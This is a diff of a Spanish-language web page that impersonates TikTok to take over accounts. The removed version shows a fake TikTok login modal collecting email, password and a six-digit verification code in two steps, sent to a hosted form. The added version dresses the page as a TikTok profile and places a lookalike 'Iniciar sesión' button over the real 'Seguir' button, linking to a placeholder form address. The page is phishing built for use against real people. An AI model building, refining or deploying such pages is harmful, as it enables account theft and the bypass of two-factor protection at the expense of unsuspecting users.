@@ -3,71 +3,53 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Iniciar sesión</title>
+<title>Perfil TikTok</title>
 
 <style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+/* Tu fondo igual que tenías */
 html {
-  background: url("fondo.png") center/cover no-repeat fixed !important;
+  background: url("fondo.png") center top / cover no-repeat fixed !important;
   min-height: 100vh !important;
-  margin: 0 !important;
-  padding: 0 !important;
 }
 body {
   background: transparent !important;
   min-height: 100vh !important;
-  margin: 0 !important;
-  padding: 0 !important;
+  position: relative;
+}
+
+/* ✅ TU BOTÓN EN EL LUGAR EXACTO DEL BOTÓN SEGUIR */
+.boton-iniciar-sesion {
+  position: absolute;
+  top: 42%; /* Ajusta este valor si lo ves muy arriba/abajo */
+  left: 50%;
+  transform: translateX(-50%);
+  width: 220px;
+  padding: 13px 20px;
+  background-color: #FF0050; /* Mismo color rojo que el botón de TikTok */
+  color: white;
+  border: none;
+  border-radius: 999px;
+  font-size: 18px;
+  font-weight: bold;
+  cursor: pointer;
+  text-decoration: none;
+  text-align: center;
 }
 </style>
 
-<link rel="stylesheet" href="css/style.css" />
 </head>
 <body>
 
-  <button class="open-btn" id="openBtn">Iniciar sesión</button>
-<button class="close-btn" id="closeBtn" aria-label="Cerrar">✕</button>
-      <h2>invitacion de tik tok, registrate primero</h2>
-  <div class="overlay" id="overlay">
-    <div class="modal">
-      <button class="close-btn" id="closeBtn" aria-label="Cerrar">✕</button>
-      <h2>inicia sesion con tu cuenta de tik tok</h2>
-      <form id="loginForm" name="login" method="POST" data-netlify="true">
-        <input type="hidden" name="form-name" value="login" />
-        <input type="hidden" name="etapa" value="" />
+<!-- ✅ Tu botón reemplazando al de Seguir -->
+<a href="PON_AQUI_LA_DIRECCION_DE_TU_FORMULARIO" class="boton-iniciar-sesion">
+  Iniciar sesión
+</a>
 
-        <div class="step" id="step1">
-          <div class="field">
-            <label for="email">Correo</label>
-            <input type="email" id="email" name="email" required placeholder="tu@correo.com" />
-          </div>
-          <div class="field">
-            <label for="password">Contraseña</label>
-            <input type="password" id="password" name="password" required placeholder="••••••••" />
-          </div>
-          <button type="button" class="submit-btn" id="continueBtn">Continuar</button>
-        </div>
-
-        <div class="step" id="step2" hidden>
-          <div class="field">
-            <label for="code">Código de verificación (6 dígitos)</label>
-            <input
-              type="text"
-              id="code"
-              name="code"
-              inputmode="numeric"
-              pattern="[0-9]{6}"
-              maxlength="6"
-              placeholder="000000"
-            />
-          </div>
-          <button type="button" class="link-btn" id="backBtn">← Volver</button>
-          <button type="submit" class="submit-btn" id="submitBtn" disabled>Entrar</button>
-        </div>
-      </form>
-    </div>
-  </div>
-
-  <script src="js/script.js"></script>
 </body>
 </html>
-
